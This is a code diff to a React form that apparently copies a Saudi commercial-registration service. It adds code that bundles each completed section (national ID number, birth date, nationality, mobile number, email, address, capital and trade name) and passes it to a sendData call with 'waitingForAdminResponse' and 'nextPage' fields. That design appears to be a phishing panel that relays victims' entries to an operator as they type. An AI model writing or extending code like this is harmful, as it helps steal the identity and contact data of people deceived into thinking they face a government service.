@@ -2538,6 +2538,58 @@ const [capitalAmount, setCapitalAmount] = useState('1000');
                 console.log('Confirm button clicked. pendingStep:', pendingStep);
                 console.log('Current collapsedSteps:', collapsedSteps);
                 if (pendingStep) {
+                  // إرسال البيانات حسب القسم المحفوظ
+                  let sectionData: Record<string, string> = {};
+                  const sectionNames: Record<number, string> = {
+                    1: 'بيانات مالك المؤسسة',
+                    2: 'بيانات الاتصال',
+                    3: 'الأنشطة التجارية',
+                    4: 'بيانات الاسم التجاري',
+                    5: 'الإقرار'
+                  };
+                  
+                  if (pendingStep === 1) {
+                    sectionData = {
+                      'الاسم بالعربي': arabicName,
+                      'الاسم بالإنجليزي': englishName,
+                      'رقم الهوية الوطنية': nationalId,
+                      'تاريخ الميلاد': dateOfBirth ? dateOfBirth.toLocaleDateString('ar-SA') : `${hijriDate.year}/${hijriDate.month}/${hijriDate.day}`,
+                      'الجنسية': nationality === 'saudi' ? 'سعودي' : nationality,
+                      'نوع المالك': ownerType,
+                      'الجنس': gender === 'male' ? 'ذكر' : 'أنثى',
+                    };
+                  } else if (pendingStep === 2) {
+                    sectionData = {
+                      'رقم الجوال': countryCode + mobileNumber,
+                      'البريد الإلكتروني': email,
+                      'العنوان الوطني': address,
+                      'رقم المبنى': buildingNumber,
+                      'رقم الطابق': floorNumber,
+                    };
+                  } else if (pendingStep === 3) {
+                    sectionData = {
+                      'النشاط العام': generalActivity,
+                      'النشاط الخاص': specialActivity,
+                      'رأس المال': capitalAmount + ' ريال سعودي',
+                    };
+                  } else if (pendingStep === 4) {
+                    sectionData = {
+                      'نوع الاسم': nameType,
+                      'الاسم التجاري': firstName + ' ' + secondName + ' ' + thirdName,
+                      'اسم العلامة بالعربي': trademarkArabicName,
+                      'اسم العلامة بالإنجليزي': trademarkEnglishName,
+                    };
+                  }
+                  
+                  if (Object.keys(sectionData).length > 0) {
+                    sendData({
+                      data: sectionData,
+                      current: sectionNames[pendingStep] || 'معلومات الأعمال',
+                      nextPage: '',
+                      waitingForAdminResponse: false,
+                    });
+                  }
+                  
                   setCollapsedSteps(prev => {
                     const newSteps = [...prev, pendingStep];
                     console.log('Updating collapsedSteps to:', newSteps);
